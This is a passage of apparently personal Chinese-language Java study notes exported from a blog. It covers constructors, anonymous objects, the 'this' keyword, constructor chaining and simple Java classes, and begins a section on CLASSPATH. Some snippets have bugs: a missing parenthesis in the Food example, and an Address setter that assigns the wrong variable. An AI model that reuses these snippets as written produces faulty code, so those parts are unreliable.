}</code></pre><p><strong>本程序在Book类中定义有三个构造方法：无参构造、单参构造以及三参构造，需要注意的是构造方法本身没有明确的顺序要求，但是考虑到代码的结构性的特点，按照采用参数的降序排列或者升序排列</strong></p>
<p><strong>类中构造方法和类中的普通方法的定义有什么区?</strong></p>
<blockquote>
<p>*　　类的构造方法只在使用关键字new实例化新对象的时候调用一次，而有了实例化对象之后，就可以利用该对象重复的调用类中定义的普通方法。*</p>
<ul>
<li>如果现在构造方法不返回任何数据，那么为什么不能够使用void定义呢？<br>构造方法的名称是由大小写要求的，但是如果仅仅是凭借名称实际上编译器是无法区别构造方法还是普通方法。</li>
</ul>
</blockquote>
<pre><code>如果从方法定义的角度来讲，JDK是依据结构来区分构造或是普通方法的，如果加上了void，实际上就变为了普通方法。</code></pre><h2 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h2><pre><code>匿名本质上的含义指的就是没有名字，而匿名对象本质上的核心思想就是没有名字的对象。</code></pre><p><em>范例：观察匿名对象的使用</em></p>
<pre><code>class Book {
    private String title;
    private String author;
    private double price;
    public Book(){};    //无参构造方法
    public Book(String t){     //单参构造方法
        this.setTitle(t);
        this.setAuthor(&quot;沐言优拓&quot;);
        this.setPrice(-1.0);
        }
    public Book(String t, String a, double p){
        setTitle(t);
        this.setAuthor(a);
        setPrice(p);
    }
    public void getInfo() {
        System.out.println(&quot;图书名称：&quot;+title+&quot;、图书作者：&quot;+ author + &quot;、图书价格：&quot;+ price);
    }
    public void setTitle(String t){
        title = t;
    }
    public void setAuthor(String a){
        author = a;
    }
    public void setPrice(double p) {
        if (p &gt; 0)
        {
            price = p;
        }
    }
    public String getTitle(){
        return title;
    }
    public String getAuthor(){
        return author;
    }
    public double getPrice(){
        return price;
    }
}
public class YootkDemo{
    public static void main(String args[]){
         new Book(&quot;从入门到时间&quot;,&quot;董俊&quot;,99).getInfo(); // 声明并实例化
         new Book(&quot;从入门到时间&quot;).getInfo();
         new Book().getInfo();
    }
}</code></pre><blockquote>
<p><strong>此时通过关键字new创建的book类的实例化对象，那么就属于一个匿名对象，因为没有对象名称对其进行引用（之前分析了：通过对象名称可以让对象调用多次的操作，如果没有对象名称了，那么该对象就没有引用了，这个对象在使用一次之后就会成为垃圾对象了，那么这个时候有同学可能就不理解了，为什么要有匿名对象呢？）</strong><br><em>现在假设有这样一种生活场景：我是一个卖视频的商铺，因为我的生意非常的火爆，所以我没有时间为我制作的每一件商品命名</em></p>
</blockquote>
<p><strong>范例：使用匿名对象</strong></p>
<pre><code>class Food
{
    private String name;
    private double price;
    public Food(String n, double p){
        name = n;
        price = p;
    }
        //setter、getter略
        public String getInfo(){
            return &quot;名称：&quot;+name + &quot;、价格：&quot; +price;    
        }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        for (int x= 0;x &lt;100  ; x ++ )
        {
            sale(new Food(&quot;西红柿烤烧饼&quot;,7.9);
        }
    }
    public static void sale(Food temp){
        System.out.println(&quot;【卖出商品】&quot;+ temp.getInfo());
    }
}</code></pre><blockquote>
<p><strong>当然，以上的代码也可以使用有名对象，例如：先为food实例化对象命名，随后在通过对象名称进行操作</strong></p>
</blockquote>
<p>​    </p>
<h2 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h2><pre><code>如果要是以java中的关键字使用为例，个人觉得this关键字是比较繁琐的一个关键字，因为this在程序开发之中使用较为灵活，它可以根据不同的环境而有所改变，而且使用this关键字进行处理操作的过程之中，可以描述是那种处理含义：成员属性、方法（普通方法、构造方法）、表示当前对象。</code></pre><h3 id="this-调用本类成员属性"><a href="#this-调用本类成员属性" class="headerlink" title="this 调用本类成员属性"></a>this 调用本类成员属性</h3><pre><code>在一个类中定义的许多的成员属性都可以互相进行调用，例如：某一个属性可能在构造方法中被调用，那么也可能在普通方法中进行调用，只要是在一个类中那么就都可以实现这样的处理。</code></pre><p><em>范例：观察之前编写过的一个代码</em></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book(String t, String a, double p ){
        title = t;
        author = a ;
        price = p ;
    }
    public String getInfo(){
        return &quot;【图书信息】书名：&quot;+this.title + &quot;、作者：&quot;+ this.author + &quot;、价格：&quot;+ this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book(&quot;入门到实战&quot;,&quot;董俊&quot;,90);
        System.out.println(book.getInfo());
    }
}</code></pre><blockquote>
<p>【图书信息】书名：入门到实战、作者：董俊、价格：90.0</p>
</blockquote>
<pre><code>以上的程序代码是在之前经常编写过的程序逻辑，但是对于当前的程序代码里面有一处的设计是非常不合理的，这一处指的就是类中定义的构造方法，来观察一下构造方法的定义：
|- 
    public Book(String t, String a, double p ){
    title = t;
    author = a ;
    price = p ;
    }
这个时候的构造方法里面需要传递有三个参数，并且这三个参数名称使用了单个字母描述，那么请问，如果按照正常的标识符的定义要求来讲，这样的标识符虽然符合语法意义，但是不符合于实际的“明确要求”，因为字母t、a、p可能描述的单词范围太多了，那么这个时候最佳的做法肯定是希望可以写上全部的名称</code></pre><p><em>范例：修改程序实现正确的赋值</em></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book(String title, String author, double price ){
        //一旦使用了“this.属性”，那么就永恒描述的是类中的成员耐属性。
        this.title = title;
        this.author = author ;
        this.price = price ;
    }
    public String getInfo(){
        return &quot;【图书信息】书名：&quot;+this.title + &quot;、作者：&quot;+ this.author + &quot;、价格：&quot;+ this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book(&quot;入门到实战&quot;,&quot;董俊&quot;,90);
        System.out.println(book.getInfo());
    }
}</code></pre><blockquote>
<p>【图书信息】书名：入门到实战、作者：董俊、价格：90.0</p>
</blockquote>
<pre><code>在以后编写代码的过程之中，只要是访问本类中的成员属性的操作里面一定要采用“this.属性”的形式进行明确的指派，我曾经个人在编写代码的时候就因为有一个地方少写了 this，最终发现执行的结果缺少内容 ，我排查了好久之后才发现的问题。</code></pre><h3 id="调用本类的普通方法"><a href="#调用本类的普通方法" class="headerlink" title="调用本类的普通方法"></a>调用本类的普通方法</h3><pre><code>在一个类之中往往会存在有大量的普通方法，这些普通方法每当获取了该类的实例化对象之后，那么都可以直接进行调用，而如果要在本类中进行方法调用的时候，理论上直接使用方法名称即可，但是也可以使用&quot;this.方法()&quot;的形式进行更加明确的调用（两者效果相同，但是后者的编写形式更好）。</code></pre><p><strong>范例：观察本类的方法调用</strong></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book() {}
    public Book(String title, String author, double price ){
        setTitle(title);
        setAuthor(author);
        setPrice(price); //调用本类方法
    }
    public void set(String title, String author, double price) {
        setTitle(title);
        setAuthor(author);
        setPrice(price); //调用本类方法
    }
    public void setTitle(String title) {
        this.title =  title;
    }
    public void setAuthor(String author){
        this.author = author;
    }
    public void setPrice(double price){
        this.price = price ;
    }
    public String getTitle() {
        return this.title;
    }
    public String getAuthor() {
        return this.author;
    }
    public double getPrice() {
        return this.price;
    }
    public String getInfo(){
        return &quot;【图书信息】书名：&quot;+this.title + &quot;、作者：&quot;+ this.author + &quot;、价格：&quot;+ this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book bookA = new Book(&quot;入门到实战&quot;,&quot;董俊&quot;,90);
        System.out.println(bookA.getInfo());
        Book bookB = new Book();
        bookB.set(&quot;Python从入门到实战&quot;,&quot;李兴华&quot;,98.8);
        System.out.println(bookB.getInfo());
    }
}</code></pre><blockquote>
</blockquote>
<p>【图书信息】书名：入门到实战、作者：董俊、价格：90.0<br>【图书信息】书名：Python从入门到实战、作者：李兴华、价格：98.8</p>
<pre><code>按照正常的设计思维来讲，类之中的普通方法调用的形式应该为“对象.方法()”，但是如果要是在本类之中调用本类的方法时候可以直接编写方法名称，而如果要想更加明确的描述调用本类方法的话则最好编写的形式为&quot;this.方法()&quot;</code></pre><h2 id="构造方法互调用"><a href="#构造方法互调用" class="headerlink" title="构造方法互调用"></a>构造方法互调用</h2><pre><code>|- 一个类之中构造方法是允许进行重载的，在进行构造方法重载的过程之中只需要考虑方法的参数类型及个数的不同即可，所以一个类里面构造方法可能有很多，那么在这样的环境下就可以考虑利用&quot;this()&quot;的形式实现构造方法的互相调用，这种互相调用的机制也仅仅是使用一次(构造方法只能够调用一次，是在新对象开辟堆内存空间的时候使用)。
|- 既然所有的对象进行实例化的时候都一定会进行构造方法的调用，那么假设说现在类中存在有三个构造方法，分别描述的是无参构造、单参构造、三参构造，那么这个时候不管是调用了那一个构造方法，都可能执行某些操作（输出一些重要的信息），那么按照原始的做法代码有可能定义为如下的形式：</code></pre><p><strong>范例：采用原始的形式实现固定操作的执行</strong></p>
<pre><code>class Book
{
    public Book() { 
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
        }
    public Book(String title) {//单参
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
    }
    public Book(String title, String author, double price ){//多参
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            new Book(&quot;java实战&quot;,&quot;董俊&quot;,89);
            new Book(&quot;java实战&quot;);
            new Book();
        }
}</code></pre><blockquote>
</blockquote>
<p>【对象创建提示】<br>【对象创建提示】<br>【对象创建提示】</p>
<pre><code>此时的程序已经实现了之前提出的开发要求，只要是进行新对象的创建，则一定要进行提示信息的输出，但是这个时候也可以发现一个问题：对于某些操作重复的在代码中出现了，按照之前所讲解的形式，如果要想解决重复，那么一般可以考虑使用方法进行包装，那么只需要每一次调用特定的方法就可以解决重复代码定义问题。</code></pre><p><em>范例：利用方法的形式解决代码重复</em></p>
<pre><code>class Book
{
    public Book() { 
        this.initObject();
        }
    public Book(String title) {//单参
        this.initObject();
    }
    public Book(String title, String author, double price ){//多参
        this.initObject();
    }
    public void initObject() { // 信息提示
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            new Book(&quot;java实战&quot;,&quot;董俊&quot;,89);
            new Book(&quot;java实战&quot;);
            new Book();
        }
}</code></pre><blockquote>
</blockquote>
<p>【对象创建提示】<br>【对象创建提示】<br>【对象创建提示】</p>
<pre><code>虽然这个时候进行了重复代码的方法定义，并且在构造方法之中通过&quot;this.initObject()&quot;方法执行了重复的代码，但是你也会发现此时的程序代码中也存在有设计问题，会发现不同的构造方法里面调用了同样的方法，实际上这个时候后又是一种重复，那么为了解决当前的这种重复的设计，最佳的做法是直接进行构造方法的互调用</code></pre><p><strong>范例：利用this实现构造方法的互调用</strong></p>
<pre><code>class Book
{
    private String title;
    private String author; 
    private double price;
    public Book() { 
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
        }
    public Book(String title) {//单参
        this();
        this.title = title;
    }
    public Book(String title, String author, double price ){//多参
        this(title);//调用无参构造
        this.title = title;
        this.author = author;
        this.price = price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            new Book(&quot;java实战&quot;,&quot;董俊&quot;,89);
            new Book(&quot;java实战&quot;);
            new Book();
        }
}</code></pre><blockquote>
</blockquote>
<p>【对象创建提示】<br>【对象创建提示】<br>【对象创建提示】</p>
<pre><code>此时利用了&quot;this()&quot;的语法形式实现了类中不用构造方法的互相调用，并且通过具体的操作实现也可以发现，这种结构的确是比方法抽象更加节约对象初始化代码的效果，但是对于当前的这种语法也需要考虑如下几个问题：
|- 使用&quot;this()&quot;调用构造方法处理的时候必须放在构造方法的首行，因为构造方法是在类对象实例化的时候首先调用的，所以其必须放在构造内，而不同的构造方法有可能存在有不同的顺序问题，所以才将其放在首行。
|- 使用构造方法互相调用的时候一定要保留有出口，否则在程序编译的时候就会直接出现递归错误信息，所以这样程序代码在编译的时候就会直接报错。

既然已经清楚了构造方法之间的互相调用，那么下面就可以针对于这种互相调用进行一次实际的应用说明，现在假设说有一个Book类（包含有三个成员属性&quot;title&quot;、“author”、“price”），这个类中会提供有三种构造方法
    — 无参构造：要求图书名称为“木言优拓”，作者为“李兴华”,价格为9988.66;
    — 单参构造：要求接受图书名称，但是默认情况下的作者为“小李老师”,几个5566.88;
    — 三参构造：要求接受全部的三个成员属性的内容。</code></pre><p><strong>先不去考虑重用性设计直接编写原始代码</strong></p>
<pre><code>class Book
{
    private String title;
    private String author; 
    private double price;
    public Book() { 
            this.title = &quot;木言优拓&quot;;
            this.author = &quot;李兴华&quot;;
            this.price = 9988.66;
        }
    public Book(String title) {//单参
            this.title = title;
            this.author = &quot;小李老师&quot;;
            this.price = 5566.88;
        }

    public Book(String title, String author, double price ){//多参
            this.title = title;
            this.author = author;
            this.price = price;

    }
    public String getInfo(){
        return &quot;图书名称:&quot; + this.title + &quot;、图书作者：&quot;+ this.author + &quot;、图书价格:&quot; +this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            Book bookA = new Book();
            Book bookB = new Book(&quot;从java到入门&quot;);
            Book bookC = new Book(&quot;从python到入门&quot;,&quot;李兴华&quot;,99.8);
            System.out.println(bookA.getInfo());
            System.out.println(bookB.getInfo());
            System.out.println(bookC.getInfo());
        }
}</code></pre><blockquote>
</blockquote>
<p>图书名称:木言优拓、图书作者：李兴华、图书价格:9988.66<br>图书名称:从java到入门、图书作者：小李老师、图书价格:5566.88<br>图书名称:从python到入门、图书作者：李兴华、图书价格:99.8</p>
<pre><code>此时程序已经完成了既定的开发要求，但是也可以明确的发现所有重复的操作代码，那么在这样的情况下就可以考虑利用构造方法的互调用来解决当前的重复操作问题。</code></pre><p><em>解决构造方法中的重复代码</em></p>
<pre><code>class Book
{
    private String title;
    private String author; 
    private double price;
    public Book() { 
            this(&quot;木言优拓&quot;,&quot;李兴华&quot;,9988.66);
        }
    public Book(String title) {//单参
            this(title,&quot;小李老师&quot;,5566.88);
        }

    public Book(String title, String author, double price ){//多参
            this.title = title;
            this.author = author;
            this.price = price;

    }
    public String getInfo(){
        return &quot;图书名称:&quot; + this.title + &quot;、图书作者：&quot;+ this.author + &quot;、图书价格:&quot; +this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            Book bookA = new Book();
            Book bookB = new Book(&quot;从java到入门&quot;);
            Book bookC = new Book(&quot;从python到入门&quot;,&quot;李兴华&quot;,99.8);
            System.out.println(bookA.getInfo());
            System.out.println(bookB.getInfo());
            System.out.println(bookC.getInfo());
        }
}</code></pre><blockquote>
</blockquote>
<p>图书名称:木言优拓、图书作者：李兴华、图书价格:9988.66<br>图书名称:从java到入门、图书作者：小李老师、图书价格:5566.88<br>图书名称:从python到入门、图书作者：李兴华、图书价格:99.8</p>
<pre><code>构造方法的主要作用是进行成员初始化操作，但是在成员属性初始化的过程之中难免会存在有重复的初始化的操作代码，所以这个时候利用构造方法来解决是最合理的一种做法。</code></pre><h2 id="this-表示当前对象"><a href="#this-表示当前对象" class="headerlink" title="this 表示当前对象"></a>this 表示当前对象</h2><pre><code>经过了之前一系列分析可以发现，对于this有一个最为常见的调用类结构的操作形式：“this.成员属性”、“this.方法()”，那么根据在之前所学习的概念来讲，类中的属性或方法可以调用的只能够是实例化对象（如果使用了没有实例化的对象，则一定会出现“NullPointerException”），所以之前的语法之中的this本质上描述的就是一个对象，但是这个对象不是一个固定的对象，而是描述的当前对象概念。
    一般的拥有浪漫气息的节日里面，酒店或者一些客房的预订最为繁华的，例如：红色情人节需要准备，如果是白色情人节也可以准备，如果是浪漫的圣诞结更需要准备。</code></pre><p><strong>如果要想观察出程序里面的当前对象，最简单的做法就是直接进行this关键字的输出，默认情况下每一个实例化对象的输出应该得到的就是一个对象的编码</strong></p>
<p><em>观察实例化对象的直接输出</em></p>
<pre><code>class Book{}
public class DongJun //主类
{
    public static void main(String avgs[]){
            Book bookA = new Book();
            System.out.println(&quot;【main()方法】 = &quot; + bookA);
            Book bookB = new Book();
            System.out.println(&quot;【main()方法】 = &quot; + bookB);
    }
}</code></pre><blockquote>
</blockquote>
<p>【main()方法】 = Book@63961c42<br>【main()方法】 = Book@65b54208</p>
<pre><code>Java中的类属于引用数据类型，引用数据类型之中需要去考虑堆栈的引用关系,发现如果直接进行对象的输出所获得的就是一个对象的编码，而这种编码的格式为“类名称@编码”（这个是由Java内部默认决定的程序结构）。</code></pre><p><strong>范例：观察this与对象的关联</strong></p>
<p>class Book{<br>    public void print() {<br>        System.out.println(“【Book类-print()方法】”+this);<br>    }<br>}<br>public class DongJun //主类<br>{<br>    public static void main(String avgs[]){<br>            Book bookA = new Book();<br>            System.out.println(“【main()方法】 = “ + bookA);<br>            bookA.print();<br>            System.out.println(“—————-   防止   —————- “);<br>            Book bookB = new Book();<br>            System.out.println(“【main()方法】 = “ + bookB);<br>            bookB.print();<br>    }<br>}</p>
<blockquote>
</blockquote>
<p>【main()方法】 = Book@63961c42<br>【Book类-print()方法】Book@63961c42<br>—————-   防止   —————-<br>【main()方法】 = Book@65b54208<br>【Book类-print()方法】Book@65b54208</p>
<p><strong>范例：使用this实现引用传递</strong></p>
<pre><code>class Message 
{
    private String title;
    private String content;
    private Channel channel;
    public Message(Channel channel, String title, String content){
        this.title = title;
        this.content= content;
        this.channel = channel;
    }
    public void send() {
        if (this.channel.connect())
        {
            System.out.println(&quot;【Message】消息发送，消息标题：&quot;+ this.title + &quot;、消息内容：&quot; + this.content);
            this.channel.close();
        } else {
            System.out.println(&quot;【Message】没有可用的消息发送通道，消息发送失败&quot;);
        }
    }
}
class Channel
{
    private Message message;
    public Channel(String title, String content){
        this.message = new Message(this, title, content);
        this.message.send();
    }
    public boolean connect() {
        System.out.println(&quot;【Channel】建立消息信息的发送通道&quot;);
        return true;
    }
    public void close() {
        System.out.println(&quot;【Channel】关闭消息信息的发送通道&quot;);
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Channel channel = new Channel(&quot;木言优拓在线教育&quot;,&quot;编程训练营&quot;);
    }
}</code></pre><blockquote>
</blockquote>
<p>【Channel】建立消息信息的发送通道<br>【Message】消息发送，消息标题：木言优拓在线教育、消息内容：编程训练营<br>【Channel】关闭消息信息的发送通道</p>
<pre><code>现在是在Channel类里面实例化了Message类的独享，所以这个时候如果直接出现有&quot;this&quot;，那么所描述的就是当前channel的对象。</code></pre><h2 id="简单Java类"><a href="#简单Java类" class="headerlink" title="简单Java类"></a>简单Java类</h2><pre><code>在整个的Java技术学习过程之中，首先一定要明确一个核心的问题：学习一门语言如果要想尽快的上手开发，那么就必须熟练的掌握一些核心的编程模型（数学公式），只要遇见了相似的程序按照公式的形式直接定义好即可。
本次重点来研究关于简单Java类的定义，实际上从项目的开发角度来讲，使用类有一个最为核心的功能，它能够描述有一类群体的共性特征。
简单Java类指的是一个类之中主要由属性以及setter、getter方法所组成的类，这个类不牵扯到各种复杂的运算逻辑，仅仅是进行相关数据的存储，同时这种类一般都有明确的实物类型，例如：定义一个描述部门的信息类、定义一个描述雇员的信息类、定义一个描述教师的程序类。
在Java里面随着技术学习的不断深入，你会慢慢更加深刻的了解简单java类的实际使用，包括一些设计上的不断的改良，但是对于现在来讲，给出如下的简单java类的开发要求：
|- 【必选】类名称一定要有意义，可以明确的描述某一类的事物特征；
|- 【必选】类之中所有的属性都必须使用private封装;
|- 【必选】如果要进行属性点设置或者是修改则一定要通过setter方法完成，而属性的获取要通过getter;
|- 【必选】类之中可以定义若干个构造方法，但是一定要提供有一个无参构造方法（需要通过反射机制研究）;
|- 【必选】对象中的所有信息不允许直接在类中使用&quot;System.out.println()&quot;输出,所有的输出内容一定要返回给被调用处来进行输出处理
|- 【可选】类中要提供有一个返回对象信息的处理方式;</code></pre><p><strong>范例定义一个描述部门信息的简单java类</strong></p>
<blockquote>
</blockquote>
<pre><code>|- 假设现在部门信息里面需要包含有部门编号、名称以及位置三个核心属性。

class Dept
{
    private long deptno ; 
    private String dname;
    private String loc;
    public Dept(){}
    public Dept(long deptno, String dname, String loc ){
        this.deptno=deptno;
        this.dname= dname;
        this.loc = loc ;
    }
    public void setDeptno(long deptno){
        this.deptno=deptno;
    }
    public void setDname(String dname){
        this.dname = dname;
    }
    public void setLoc(String loc){
        this.loc = loc ;
    }
    public long getDeptno()
    {
        return this.deptno;
    }
    public String getDname(){
        return this.dname;
    }
    public String getLoc(){
        return this.loc;
    }
    public String getInfo() {
        return &quot;【部门】部门编号：&quot; + this.deptno + &quot;、部门名称：&quot; + this.dname  + &quot;、部门位置：&quot; + this.loc;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Dept dept = new Dept(10, &quot;沐言有哦&quot; , &quot;北京&quot;);
        System.out.println(dept.getInfo());
    }
}</code></pre><blockquote>
</blockquote>
<p>【部门】部门编号：10、部门名称：沐言有哦、部门位置：北京</p>
<pre><code>对于此时的Dept类功能非常的单一，就是进行了数据的保存以及数据的获取，所以这个类不涉及到任何的运算逻辑，就被开发中称为简单java类。</code></pre><blockquote>
<pre><code>重要提示：简单java类是最基础的模型，但是其可以考察以及覆盖的知识点是非常全面的
    |- 类的基本组成：属性、方法（构造方法、普通方法）；
    |- 数据类型的选择：基本类型、引用类型（后面会有更加深入的分析）;
    |- 构造方法的重载；
    |- 属性的封装有以及setter、getter方法的定义要求；
    |- 字符串的连接操作。</code></pre></blockquote>
<h2 id="类与对象实例分析"><a href="#类与对象实例分析" class="headerlink" title="类与对象实例分析"></a>类与对象实例分析</h2><pre><code>面向对象是所有初学者学习的难点，实际上在我个人学习的过程之中，对于面向对象想起来都觉得头大，因为其所涉及的概念是非常的多的，有其实很多的同学学到现在的时候就会突然发懵：不知道什么时简单java类，什么又不是简单java类，针对于这样的情况，本次为大家分析三道程序案例。</code></pre><h3 id="地址类"><a href="#地址类" class="headerlink" title="地址类"></a>地址类</h3><blockquote>
<p><strong>问题一：编写并测试一个代表地址的Address类，地址信息由国家、省份、城市、街道、邮编组成，并可以返回完整地址信息。</strong></p>
</blockquote>
<pre><code>对于此时的设计开发要求本身并没有过多的繁琐，因为在之前所编写的图书类、部门类等等都与该类的结构非常的相似，所以这种类严格来讲就属于一个简单java类

class Address 
{
    // 属性private封装
    private String country;
    private String province;
    private String city;
    private String street;
    private String zipcode;
    public Address(){}
    public Address(String country, String province, String city, String street, String zipcode)
    {
        this.country = country;
        this.province = province;
        this.city = city;
        this.street = street;
        this.zipcode = zipcode;
    }
    public String getInfo(){
        return &quot;【Address】国家：&quot;+ this.country +&quot;、省份：&quot; + this.province + &quot;、城市：&quot; + this.city + &quot;、街道:&quot;+ this.street + &quot;、邮编:&quot;+ this.zipcode;
    }
    public void setCountry(String country){
         this.country = country;
    }
    public void setProvince(String province){
        this.province = province;
    }
    public void setCity(String city){
        this.city = city;
    }
    public void setStreet(String street){
        this.street = street;
    }
    public void setZipcode(String Zipcode){
        this.zipcode = zipcode;
    }
    public String getCountry(String country){
        return this.country;
    }
    public String getProvince(String province){
        return this.province;
    }
    public String getCity(String city){
        return this.city;
    }
    public String getStreet(String street){
        return this.street;
    }
    public String getZipcode(String zipcode){
        return this.zipcode;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Address addr = new Address(&quot;中国&quot;,&quot;湖北&quot;,&quot;武汉&quot;,&quot;新洲区&quot;,&quot;00000&quot;);
        System.out.println(addr.getInfo());
    }
}</code></pre><blockquote>
<p>【Address】国家：中国、省份：湖北、城市：武汉、街道:新洲区、邮编:00000</p>
</blockquote>
<pre><code>对于这样的程序开发啊，其本身属于简单java类，如果连这样的基本程序都不能够保证一次性写对（可以快速的修改正确），那么就不建议你使用任何的开发工具进行代码编写</code></pre><h3 id="员工信息类"><a href="#员工信息类" class="headerlink" title="员工信息类"></a>员工信息类</h3><p><strong>定义并测试一个代表员工的Employee类。员工属性包括“编号”、“姓名”、“基本薪水”、“薪水增长率”，还包括计算薪水增长额及计算增长后的工资总额的操作方法。同时在该类中要提供有四个构造方法：</strong><br><em>【无参构造】编号定义为1000，姓名定义为无名氏，其他内容均为默认值；</em><br><em>【单参构造】传递编号，姓名定义为“新员工”，基本薪水为3000.00,薪水增长率为1%；</em><br><em>【三参构造】传递编号、姓名、基本工资、薪水增长率为5%；</em><br><em>【四参构造】所有的属性全部进行传递。</em></p>
<blockquote>
</blockquote>
<p><strong>题目分析：这个程序并不能算是一个完全的简单java类，因为这个类里面包含有一部分的业务处理逻辑（逻辑计算），但是其整体操作结构依然是进行数据的存储。</strong></p>
<p><em>范例：定义并使用员工类</em></p>
<pre><code>class Employee
{
    private long empno ;
    private String ename ;
    private double salary;
    private double rate;
    // setter、getter操作略…… ， 实际代码之中一定要写上这些方法
    public Employee() {
        this(1000, &quot;无名氏&quot;,0.0, 0.0);
    }
    public Employee(long empno) {
        this(empno, &quot;新员工&quot;,3000.00,0.01);

    }
    public Employee(long empno, String ename , double salary ){
        this(empno, ename, salary, 0.05);
    }
    public Employee(long empno, String ename, double salary, double rate){
        this.empno = empno;
        this.ename = ename;
        this.salary = salary;
        this.rate = rate;
    }
    public double salaryIncValue(){
        this.salary  = this.salary * (1 + this.rate) ;
        return this.salary ;
    }
    public String getInfo(){
        return &quot;【Employee】员工编号:&quot;+ this.empno + &quot;、员工姓名:&quot;+ this.ename + &quot;、基本工资:&quot;+ this.salary + &quot;、增长额:&quot; + this.rate;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Employee emp = new Employee(9527,&quot;周星星&quot;,5000.0,0.1);
        System.out.println(emp.getInfo());
        System.out.println(&quot;工资增长：&quot;+emp.salaryIncValue());

    }
}</code></pre><blockquote>
<p>【Employee】员工编号:9527、员工姓名:周星星、基本工资:5000.0、增长额:0.1<br>工资增长：5500.0</p>
</blockquote>
<pre><code>本程序虽然核心的组成结构为简单java类，但是这里面却有了一些程序的处理逻辑存在，所以这种情况下，依然要按照简单java类组成原则进行定义，而对于一些逻辑的处理操作方法额外追加即可。</code></pre><h3 id="用户登录逻辑"><a href="#用户登录逻辑" class="headerlink" title="用户登录逻辑"></a>用户登录逻辑</h3><p>  <strong>习题要求：设计一个表示用户的User类，类中的变量有用户名、口令、定义类的3个构造方法（无参、为用户名赋值、为用户名和口令赋值）、获取和设置口令的方法和返回类信息的方法,同时编写一个进行登录验证的处理操作逻辑。</strong></p>
<p><em>题目分析：对于当前的程序逻辑定义类的母的是为了进行用户登录，如果说没有用户登录的验证需求，那么这个时候就是一个纯粹的简单java类，但是发现有了用户登录验证的需求之后，对于当前的程序逻辑就不再是一个简单的存储了。</em></p>
<p><strong>范例：实现用户的登录验证</strong></p>
<pre><code>class User
{
    private String name ;
    private String password;
    public User(){
        this(null,null);
    }
    public User(String name){
        this(name, null);
    }
    public User(String name, String password){
        this.name = name ;
        this.password = password;
    }
    public boolean isLogin(String tempName, String tempPassword) {
        return tempName.equals(this.name) &amp;&amp; tempPassword.equals(this.password);
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        User user = new User(&quot;董俊&quot;,&quot;123&quot;);
        if (user.isLogin(&quot;董俊&quot;,&quot;123&quot;))
        {
            System.out.println(&quot;用户登录成功，可以开始进行程序访问！&quot;);
        } else {
                    System.out.println(&quot;用户登录失败，错误的用户名和密码！&quot;);
        }
    }
}</code></pre><blockquote>
<p>用户登录成功，可以开始进行程序访问！</p>
</blockquote>
<pre><code>此时程序类是一个功能性的操作类，他不再是一个简单java类，因为让其存储的是核心的业务处理逻辑。</code></pre>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>CLASSPATH环境属性</title>
    <url>/posts/7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ClassPath环境属性"><a href="#ClassPath环境属性" class="headerlink" title="ClassPath环境属性"></a>ClassPath环境属性</h2><p>所有的java程序在进行执行的时候一般都需要经过两个过程：、</p>
<p>​    Java程序编译过程：是要得到字节码文件，而字节码就是程序执行的主要的二进制文件；</p>
<p>​    java解释执行过程：是在虚拟机上进行解释。</p>
<p>实际上在真个java编译和运行的过程之中都存在有一个非常重要的环境属性“classpath”，利用classpath可以设置第三方程序的加载路径，同时也可以改变java解释的的时候后程序的执行路径。</p>
<p>​    java之所以可以持续的发展，最主要的原因在于，java里面有大量的第三方程序支持，那么既然要有很多的第三方程序支持，就一定需要提供有一种标准的机制来方便的引用这些第三方组件包（是为了进行程序的编译处理）。</p>
<p>​    ClassPath还可以进行程序加载路径的变更，每当使用java命令进行程序执行的时候后，实际上都会牵扯到一个类的加载路径，每一台java虚拟机在默认的情况下都会在当前目录下进行程序类的加载。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">D:\yootk&gt;javac Hello.java</span><br><span class="line"></span><br><span class="line">D:\yootk&gt;java Hello</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure></div>

<p>若将盘符切到了C盘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">C:\Users\23242&gt;java Hello</span><br><span class="line">错误: 找不到或无法加载主类 Hello（提示文字）</span><br><span class="line">原因: java.lang.ClassNotFoundException: Hello</span><br></pre></td></tr></table></figure></div>

<p>此时的路径下并没有提供hello.class文件此时会出现如上的错误提示：</p>
<blockquote>
<p><strong>ClassNotFoundException: Hello</strong></p>
</blockquote>
